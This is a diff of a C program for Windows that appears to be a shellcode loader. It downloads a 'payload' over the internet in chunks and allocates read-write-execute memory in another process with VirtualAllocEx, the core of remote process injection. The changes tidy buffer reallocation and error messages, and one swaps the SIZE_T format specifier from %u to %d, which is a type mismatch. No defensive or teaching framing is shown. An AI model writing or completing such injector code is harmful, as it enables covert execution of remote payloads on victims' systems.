@@ -24,8 +24,8 @@ int main(int argc, char** argv) {
 	DWORD PID = NULL, TID=NULL;
 	HINTERNET hInternet = NULL, hFileHandle = NULL;
 	DWORD dwBytesRead = NULL;
-	STARTUPINFO si = { sizeof(si) };
-	PROCESS_INFORMATION pi = { 0 };
+	STARTUPINFO si = { sizeof(si) };  //   - _______________ both are used when creating a process
+	PROCESS_INFORMATION pi = { 0 };    //  _|
 	SIZE_T sSize = NULL; // Used as the total payload size
 	PBYTE pBytes = NULL; // Used as the total payload heap buffer
 	PBYTE pTmpBytes = NULL; // Used as the temp buffer of size 1024 bytes
@@ -75,10 +75,11 @@ int main(int argc, char** argv) {
 		if (pBytes == NULL) { // first time read upto 1024
 			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
 		}
-			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
-			// This is required in order to fit the whole payload
-		pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+		else {
+			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+		}
 		if (pBytes == NULL) {
+			warn("ALLOCATION OR REALLOCATION FAILED!");
 				return EXIT_FAILURE;
 		}
 		// Append the temp buffer to the end of the total buffer
@@ -108,7 +109,7 @@ int main(int argc, char** argv) {
 	}
 
 	rbuffer = VirtualAllocEx(hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	printf("[*] Successfully Allocated the %u-bytes with the rwx privledges\n", sSize);
+	printf("[*] Successfully Allocated the %d-bytes with the rwx privledges\n", sSize);
 	
 	if (rbuffer == NULL) {
 		warn("Failed to allocated the buffer memory! : %ld", GetLastError());
